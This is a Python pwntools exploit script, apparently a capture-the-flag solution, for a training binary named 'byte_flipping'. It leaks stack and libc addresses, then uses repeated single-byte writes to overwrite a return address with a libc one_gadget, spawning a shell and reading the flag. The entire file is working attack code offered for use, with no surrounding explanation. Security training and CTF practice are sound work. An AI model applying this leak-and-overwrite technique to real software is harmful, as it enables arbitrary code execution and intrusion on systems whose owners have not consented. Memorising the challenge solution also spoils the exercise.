from pwn import *
import sys
import time

context.arch = 'amd64'

def leak(skip):
    t = p.recvuntil(b'Good luck ' + b'A'*skip)
    leak = p.recvuntil(b' ;)')[:-len(' ;)')] + b"\x00\x00"
    return u64(leak)

def flip(address, value):
    p.recvuntil(b'Address: ')
    p.sendline(str(hex(address)))
    p.recvuntil(b'Value: ')
    p.sendline(value)
    time.sleep(0.1)

def take_byte(num, byte):
    # Calculate the number of bits to shift
    shift_bits = (byte - 1) * 8  # Bytes are indexed starting from 1

    # Extract the byte by shifting and applying a mask
    result = (num >> shift_bits) & 0xff  # 0xFF is used as a mask to extract the byte

    return str(hex(result))

if(len(sys.argv) > 1):
    if(sys.argv[1] == '--debug'):
        p = process("./byte_flipping")
        gdb.attach(p, """
        b *welcome+74
        b *welcome+113
        b *welcome+137
        b *play+224
        b *play+251
        """ )
        input("wait...")
    elif(sys.argv[1] == '--strace'):
        p = process(["strace", "./byte_flipping"])
    elif(sys.argv[1] == '--remote'):
        p = remote("bin.training.offdef.it", 4003)
else:
    p = process("./byte_flipping")

libc = ELF("./libc-2.35.so")
flip_addr = 0x00602068

# LEAK STACK

p.send(b"A"*24)
stack = leak(24)
print('stack leak: %#x' % stack)
#main@ 0x004007c7
#game@ 0x004007e5
#start@ 0x004006e0
#play@ 0x004009cd
#Return To Welcome.read(): 004008af (welcome base: 0x0040084f)
flip(stack-0x8, b"0xe0")
flip(stack-0x7, b"0x06")
flip(flip_addr, b"0x6")

p.recvuntil(b'Good luck')
# LEAK LIBC

p.send(b"A")
leak = leak(0)
libc.address = leak - 2202177
print('leak libc: %#x' % leak)
print('libc base address: %#x' % libc.address)
print('system@libc: %#x' % libc.symbols.system)
print('binsh@: %#x' % next(libc.search(b"/bin/sh\x00")))

one_gadget = libc.address + 0x50a37 #one_gadgets: 0x50a37 0xebcf1 0xebcf5 0xebdaf 0xebdb3, Not Working: 0xebcf8 0xebd52 

print('one_gadget: %#x' % one_gadget)

flip(stack-0x138, take_byte(one_gadget, 1))
flip(stack-0x137, take_byte(one_gadget, 2))
flip(stack-0x136, take_byte(one_gadget, 3))
flip(stack-0x135, take_byte(one_gadget, 4))
flip(stack-0x134, take_byte(one_gadget, 5))
flip(stack-0x133, take_byte(one_gadget, 6))

time.sleep(0.1)
p.sendline('cat flag')

p.interactive()